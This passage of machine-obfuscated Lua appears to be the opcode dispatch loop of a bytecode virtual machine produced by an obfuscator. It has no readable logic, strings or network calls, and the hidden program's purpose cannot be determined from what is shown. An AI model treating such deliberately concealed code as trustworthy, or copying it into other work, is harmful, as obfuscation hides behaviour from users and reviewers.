y=f[n];end else if ba<=157 then bb=y[548]else if 159~=ba then w[bb]=w[bb](w[bb+1])else break end end end end end end end end ba=ba+1 end elseif 98~=z then a(c,e);else local ba;local bb;local bc;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];bc=y[548]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[554]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=99 then if(w[y[548]]<=w[y[554]])then n=y[613];else n=(n+1);end;elseif 100<z then local ba=y[548]local bb,bc=i(w[ba](w[ba+1]))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;else if(w[y[548]]~=y[554])then n=y[613];else n=n+1;end;end;elseif 104>=z then if 102>=z then local ba;w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](w[ba+1])elseif z==103 then local ba=y[548]local bb={}for bc=1,#v do local bd=v[bc]for be=1,#bd do local bd=bd[be]local be,be=bd[1],bd[2]if be>=ba then bb[be]=w[be]bd[1]=bb v[bc]=nil;end end end else local ba=y[548]w[ba]=w[ba](r(w,ba+1,p))end;elseif z<=105 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];if w[y[548]]then n=n+1;else n=y[613];end;elseif 106<z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];if w[y[548]]then n=n+1;else n=y[613];end;else local ba=y[613];local bb=y[554];local ba=k(w,g,ba,bb);w[y[548]]=ba;end;elseif z<=113 then if z<=110 then if 108>=z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];if w[y[548]]then n=n+1;else n=y[613];end;elseif z~=110 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[548]]=false;n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];for bb=y[548],y[613],1 do w[bb]=nil;end;n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](w[ba+1])else local ba;w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))end;elseif z<=111 then local ba;local bb;local bc;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];bc=y[548]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[554]do ba=ba+1;w[bd]=bb[ba];end elseif z==112 then local ba;local bb;local bc;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];bc=y[548]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[554]do ba=ba+1;w[bd]=bb[ba];end else local ba;local bb;w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];bb=y[548];ba=w[y[613]];w[bb+1]=ba;w[bb]=ba[w[y[554]]];end;elseif z<=116 then if z<=114 then local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))elseif z==115 then local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]]*y[554];n=n+1;y=f[n];w[y[548]]=w[y[613]]+w[y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]]+w[y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))else local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))end;elseif z<=117 then local ba;local bb;local bc;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];bc=y[548]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[554]do ba=ba+1;w[bd]=bb[ba];end elseif 119~=z then local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))else if(w[y[548]]<w[y[554]])then n=n+1;else n=y[613];end;end;elseif z<=131 then if z<=125 then if z<=122 then if z<=120 then w[y[548]][y[613]]=y[554];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];elseif 122~=z then local ba=y[548]w[ba]=w[ba]()else w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];if(w[y[548]]~=y[554])then n=n+1;else n=y[613];end;end;elseif 123>=z then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[548]]=w[y[613]][y[554]];end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if ba<=6 then y=f[n];else if 8>ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if ba==9 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end else if ba<=11 then n=n+1;else if 12==ba then y=f[n];else w[y[548]]=false;end end end else if ba<=15 then if 14<ba then y=f[n];else n=n+1;end else if ba<=16 then bb=y[548]else if 17<ba then break else w[bb](w[bb+1])end end end end end ba=ba+1 end elseif 125>z then w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];if w[y[548]]then n=n+1;else n=y[613];end;else local ba;local bb;local bc;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];bc=y[548]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[554]do ba=ba+1;w[bd]=bb[ba];end end;elseif 128>=z then if z<=126 then local ba=w[y[554]];if not ba then n=n+1;else w[y[548]]=ba;n=y[613];end;elseif z==127 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))else local ba;local bb;local bc;w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];bc=y[548]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[554]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=129 then w[y[548]]=false;n=n+1;elseif z~=131 then local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))else local ba=y[548];local bb=w[ba];for bc=ba+1,y[613]do t(bb,w[bc])end;end;elseif 137>=z then if 134>=z then if 132>=z then local ba=y[548];local bb,bc,bd=w[ba],w[ba+1],w[ba+2];local bb=bb+bd;w[ba]=bb;if bd>0 and bb<=bc or bd<0 and bb>=bc then n=y[613];w[ba+3]=bb;end;elseif z>133 then local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];ba=y[548]w[ba](r(w,ba+1,y[613]))else local ba;local bb;local bc;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];bc=y[548]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[554]do ba=ba+1;w[bd]=bb[ba];end end;elseif 135>=z then local ba=y[548];p=(ba+x)-1;for bb=ba,p do local ba=q[bb-ba];w[bb]=ba;end;elseif 137>z then w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];n=y[613];else local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))end;elseif z<=140 then if z<=138 then w[y[548]]=w[y[613]][y[554]];elseif z>139 then local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba]()else local ba;local bb;local bc;w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];bc=y[548]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[554]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=141 then w[y[548]][y[613]]=w[y[554]];elseif z==142 then local ba;w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))else local ba=y[548]local bb={w[ba](r(w,ba+1,y[613]))};local bc=0;for bd=ba,y[554]do bc=bc+1;w[bd]=bb[bc];end;end;elseif z<=167 then if z<=155 then if(149>=z)then if z<=146 then if(144==z or 144>z)then do return w[y[548]]end elseif(146>z)then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 0<ba then w[y[548]]=j[y[613]];else bb=nil end else if ba<=2 then n=n+1;else if 4~=ba then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end else if ba<=7 then if ba<=5 then n=n+1;else if 7>ba then y=f[n];else w[y[548]]=y[613];end end else if ba<=8 then n=n+1;else if ba<10 then y=f[n];else w[y[548]]=y[613];end end end end else if ba<=15 then if ba<=12 then if ba>11 then y=f[n];else n=n+1;end else if ba<=13 then w[y[548]]=y[613];else if 14==ba then n=n+1;else y=f[n];end end end else if ba<=18 then if ba<=16 then w[y[548]]=y[613];else if ba<18 then n=n+1;else y=f[n];end end else if ba<=19 then bb=y[548]else if 21~=ba then w[bb]=w[bb](r(w,bb+1,y[613]))else break end end end end end ba=ba+1 end else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba<1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4>ba then w[y[548]]=h[y[613]];else n=n+1;end end end else if ba<=6 then if ba<6 then y=f[n];else w[y[548]]=h[y[613]];end else if ba<=7 then n=n+1;else if ba==8 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end else if ba<=14 then if ba<=11 then if ba~=11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[548]]=w[y[613]][w[y[554]]];else if ba>13 then y=f[n];else n=n+1;end end end else if ba<=16 then if ba>15 then bc={w[bd](w[bd+1])};else bd=y[548]end else if ba<=17 then bb=0;else if 18==ba then for be=bd,y[554]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif(z<147 or z==147)then w[y[548]]=true;elseif(z==148)then local ba=y[548];do return w[ba](r(w,(ba+1),y[613]))end;else if(not(w[y[548]]==y[554]))then n=y[613];else n=n+1;end;end;elseif(152>=z)then if(150==z or 150>z)then local ba=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0==ba then w[y[548]][y[613]]=y[554];else n=n+1;end else if ba<=2 then y=f[n];else if 3<ba then n=n+1;else w[y[548]]={};end end end else if ba<=6 then if ba>5 then w[y[548]][y[613]]=w[y[554]];else y=f[n];end else if ba<=7 then n=n+1;else if 8<ba then w[y[548]]=h[y[613]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[548]]=w[y[613]][y[554]];else if 14~=ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba==15 then w[y[548]][y[613]]=w[y[554]];else n=n+1;end else if ba<=17 then y=f[n];else if ba<19 then w[y[548]][y[613]]=w[y[554]];else break end end end end end ba=ba+1 end elseif z<152 then local ba=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba<1 then w={};else for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;end else if ba<=2 then n=n+1;else if 4~=ba then y=f[n];else w[y[548]]=y[613];end end end else if ba<=6 then if 6~=ba then n=n+1;else y=f[n];end else if ba<=7 then w[y[548]]=h[y[613]];else if 8==ba then n=n+1;else y=f[n];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then w[y[548]]=h[y[613]];else n=n+1;end else if ba<=12 then y=f[n];else if ba<14 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end end else if ba<=17 then if ba<=15 then y=f[n];else if ba>16 then n=n+1;else w[y[548]]=w[y[613]][w[y[554]]];end end else if ba<=18 then y=f[n];else if 19==ba then if(w[y[548]]~=y[554])then n=n+1;else n=y[613];end;else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if ba==1 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end else if ba<=3 then y=f[n];else if ba~=5 then w[y[548]]=h[y[613]];else n=n+1;end end end else if ba<=8 then if ba<=6 then y=f[n];else if 7<ba then n=n+1;else w[y[548]]=w[y[613]][y[554]];end end else if ba<=9 then y=f[n];else if ba<11 then w[y[548]]=h[y[613]];else n=n+1;end end end end else if ba<=17 then if ba<=14 then if ba<=12 then y=f[n];else if ba==13 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end else if ba<=15 then y=f[n];else if 17~=ba then w[y[548]]=h[y[613]];else n=n+1;end end end else if ba<=20 then if ba<=18 then y=f[n];else if ba<20 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end else if ba<=22 then if ba==21 then y=f[n];else bb=y[548]end else if ba==23 then w[bb]=w[bb](r(w,bb+1,y[613]))else break end end end end end ba=ba+1 end end;elseif(z==153 or z<153)then w[y[548]]=(w[y[613]]%y[554]);elseif(z==154)then local ba=y[548];do return w[ba](r(w,ba+1,y[613]))end;else local ba,bb,bc,bd=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 3<ba then n=n+1;else w[y[548]]=h[y[613]];end end end else if ba<=7 then if ba<=5 then y=f[n];else if 7>ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end else if ba<=8 then y=f[n];else if ba>9 then n=n+1;else w[y[548]]=w[y[613]][y[554]];end end end end else if ba<=16 then if ba<=13 then if ba<=11 then y=f[n];else if 12<ba then n=n+1;else w[y[548]]=h[y[613]];end end else if ba<=14 then y=f[n];else if 15<ba then n=n+1;else w[y[548]]=w[y[613]][y[554]];end end end else if ba<=19 then if ba<=17 then y=f[n];else if ba<19 then bd=y[613];else bc=y[554];end end else if ba<=20 then bb=k(w,g,bd,bc);else if ba==21 then w[y[548]]=bb;else break end end end end end ba=ba+1 end end;elseif z<=161 then if z<=158 then if z<=156 then if not w[y[548]]then n=n+1;else n=y[613];end;elseif 158~=z then local ba=y[548]w[ba](w[ba+1])else w[y[548]]=w[y[613]]/y[554];end;elseif 159>=z then w[y[548]]=b(d[y[613]],nil,j);elseif 161>z then local ba;local bb;local bc;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];bc=y[548]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[554]do ba=ba+1;w[bd]=bb[ba];end else w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];if(w[y[548]]~=y[554])then n=n+1;else n=y[613];end;end;elseif 164>=z then if 162>=z then w[y[548]]=(not w[y[613]]);elseif z~=164 then local ba;w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];for ba=y[548],y[613],1 do w[ba]=nil;end;n=n+1;y=f[n];n=y[613];end;elseif 165>=z then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=#w[y[613]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];ba=y[548];w[ba]=w[ba]-w[ba+2];n=y[613];elseif z>166 then local ba;w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](w[ba+1])else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];if w[y[548]]then n=n+1;else n=y[613];end;end;elseif z<=179 then if 173>=z then if 170>=z then if z<=168 then local ba;local bb;local bc;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];bc=y[613];bb=y[554];ba=k(w,g,bc,bb);w[y[548]]=ba;elseif 169==z then local ba;local bb;local bc;w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];bc=y[548]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[554]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]][y[613]]=y[554];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))end;elseif z<=171 then local ba,bb=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if ba==1 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end else if ba<=4 then if ba<4 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end else if 6>ba then n=n+1;else y=f[n];end end end else if ba<=10 then if ba<=8 then if 8>ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if ba<10 then y=f[n];else w[y[548]]=w[y[613]]*y[554];end end else if ba<=12 then if ba>11 then y=f[n];else n=n+1;end else if 13<ba then n=n+1;else w[y[548]]=w[y[613]]+w[y[554]];end end end end else if ba<=22 then if ba<=18 then if ba<=16 then if 15<ba then w[y[548]]=j[y[613]];else y=f[n];end else if ba~=18 then n=n+1;else y=f[n];end end else if ba<=20 then if 19<ba then n=n+1;else w[y[548]]=w[y[613]][y[554]];end else if 22>ba then y=f[n];else w[y[548]]=w[y[613]];end end end else if ba<=26 then if ba<=24 then if ba<24 then n=n+1;else y=f[n];end else if ba>25 then n=n+1;else w[y[548]]=w[y[613]]+w[y[554]];end end else if ba<=28 then if 28~=ba then y=f[n];else bb=y[548]end else if ba>29 then break else w[bb]=w[bb](r(w,bb+1,y[613]))end end end end end ba=ba+1 end elseif 173>z then local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))else w[y[548]][y[613]]=y[554];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];end;elseif z<=176 then if 174>=z then w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];n=y[613];elseif 176>z then local ba=y[548]w[ba](r(w,ba+1,p))else w[y[548]]=false;end;elseif 177>=z then local ba=y[548]local bb={w[ba](r(w,ba+1,p))};local bc=0;for bd=ba,y[554]do bc=bc+1;w[bd]=bb[bc];end elseif 178<z then local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](w[ba+1])else local ba;w[y[548]]=w[y[613]]%w[y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]]+y[554];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))end;elseif z<=185 then if 182>=z then if z<=180 then local ba=y[548]local bb={w[ba](w[ba+1])};local bc=0;for bd=ba,y[554]do bc=bc+1;w[bd]=bb[bc];end elseif z==181 then local ba;w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba]()else local ba;local 